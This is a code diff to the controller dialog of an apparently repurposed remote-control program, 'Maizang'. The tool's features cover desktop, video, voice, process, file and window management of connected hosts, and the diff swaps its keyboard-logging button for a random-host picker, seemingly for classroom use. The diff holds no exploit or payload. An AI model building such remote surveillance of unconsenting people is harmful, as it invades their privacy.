@@ -9,6 +9,7 @@
 #include "VoiceManage.h"
 #include "OpenUrlDlg.h"
 #include "MessageBoxDlg.h"
+#include <time.h>
 
 #ifndef _HEAD_COMMAND_H
 #define _HEAD_COMMAND_H
@@ -76,6 +77,7 @@ protected:
 	//}}AFX_MSG
 	DECLARE_MESSAGE_MAP()
 public:
+	
 };
 
 CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
@@ -95,6 +97,7 @@ BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
 //{{AFX_MSG_MAP(CAboutDlg)
 // No message handlers
 //}}AFX_MSG_MAP
+
 END_MESSAGE_MAP()
 
 /////////////////////////////////////////////////////////////////////////////
@@ -399,7 +402,7 @@ void CMaizangDlg::ShowMessage(bool bIsOk, CString strMsg)
 void CMaizangDlg::OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult)
 {
 	// TODO: Add your control notification handler code here
-
+    
 	POSITION pos = m_List_Online.GetFirstSelectedItemPosition();
 	int iCurrSel= m_List_Online.GetNextSelectedItem(pos);
 	if(iCurrSel >= 0)
@@ -413,7 +416,7 @@ void CMaizangDlg::OnRclickOnline(NMHDR* pNMHDR, LRESULT* pResult)
         m_ChoseSocket = INVALID_SOCKET;
 		m_CurrIndex = -1;
 	}
-
+	
     CMenu popup;
 	popup.LoadMenu(IDR_MENU_ONLINE);
 	CMenu *pM=popup.GetSubMenu(0);
@@ -497,12 +500,12 @@ void CMaizangDlg::OnOnlineAudio()
 		m_ChoseSocket  = m_List_Online.GetItemData(iCurrSel);
 		m_CurrIndex = iCurrSel;
 	}
-	else
-	{
+	//else
+	//{
 
-		m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
+		//m_ChoseSocket = INVALID_SOCKET;
+		//m_CurrIndex = -1;
+	//}
 	if (m_ChoseSocket ==  INVALID_SOCKET) 
 	{
 		MessageBox("您还未选中任何主机");
@@ -591,7 +594,9 @@ void CMaizangDlg::OnOnlineWindow()
 
 
 void CMaizangDlg :: openDlg(int cmd){
-	getChooseSocket();
+	if(m_ChoseSocket == INVALID_SOCKET){
+		getChooseSocket();
+	}
 	if (m_ChoseSocket == INVALID_SOCKET){
 		MessageBox("你还未选中任何主机");
 		return;
@@ -614,7 +619,18 @@ void CMaizangDlg :: openDlg(int cmd){
 void CMaizangDlg::OnOnlineKeyboard()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("键盘记录");
+	srand((int)time(0));
+	if(Online_computer_count == 0){
+			::MessageBox(NULL, "当前没有主机上线", "当前没有主机上线", MB_OK);
+		return ;
+	}
+	int host = rand() % Online_computer_count;
+	m_ChoseSocket = m_List_Online.GetItemData(host);
+	CString str = m_List_Online.GetItemText(host, 0);
+
+	CString out;
+	out.Format("选中主机: %s ， 你现在可以对他做任何操作，比如用广播发送一个题目", str);
+	::MessageBox(NULL, out, "您选中主机如下", MB_OK);
 }
 
 //教室各种功能
@@ -658,7 +674,7 @@ void CMaizangDlg::CreatToolBar()
 	m_ToolBar.SetButtonText(0,"桌面管理");
 	m_ToolBar.SetButtonText(1,"视频管理");
 	m_ToolBar.SetButtonText(2,"进程管理");
-	m_ToolBar.SetButtonText(3,"键盘管理");
+	m_ToolBar.SetButtonText(3,"随机选中");
 	m_ToolBar.SetButtonText(4,"语音管理");
 	m_ToolBar.SetButtonText(5,"文件管理");
 	m_ToolBar.SetButtonText(6,"窗口管理");
@@ -1063,16 +1079,18 @@ void CMaizangDlg::getChooseSocket(){
 		m_ChoseSocket = m_List_Online.GetItemData(iCurrSel);
 		m_CurrIndex = iCurrSel;
 	}
-	else{
-		m_ChoseSocket = INVALID_SOCKET;
-		m_CurrIndex = -1;
-	}
+//	else{
+	//	m_ChoseSocket = INVALID_SOCKET;
+		//m_CurrIndex = -1;
+	//}
 }
 
 void CMaizangDlg::OnOnlineOpenurl()
 {
 	// TODO: 在此添加命令处理程序代码
+	if(m_ChoseSocket == INVALID_SOCKET){
 	getChooseSocket();
+	}
 	if(m_ChoseSocket == INVALID_SOCKET) {
 		::MessageBox(NULL, "未选中任何主机", "未选中任何主机", MB_OK);
 		return ;
@@ -1088,7 +1106,9 @@ void CMaizangDlg::OnOnlineOpenurl()
 void CMaizangDlg::OnOnlineMessagebox()
 {
 	// TODO: 在此添加命令处理程序代码
-	getChooseSocket();
+	if(m_ChoseSocket == INVALID_SOCKET){
+		getChooseSocket();
+	}
 	if(m_ChoseSocket == INVALID_SOCKET) {
 		::MessageBox(NULL, "未选中任何主机", "未选中任何主机", MB_OK);
 		return ;
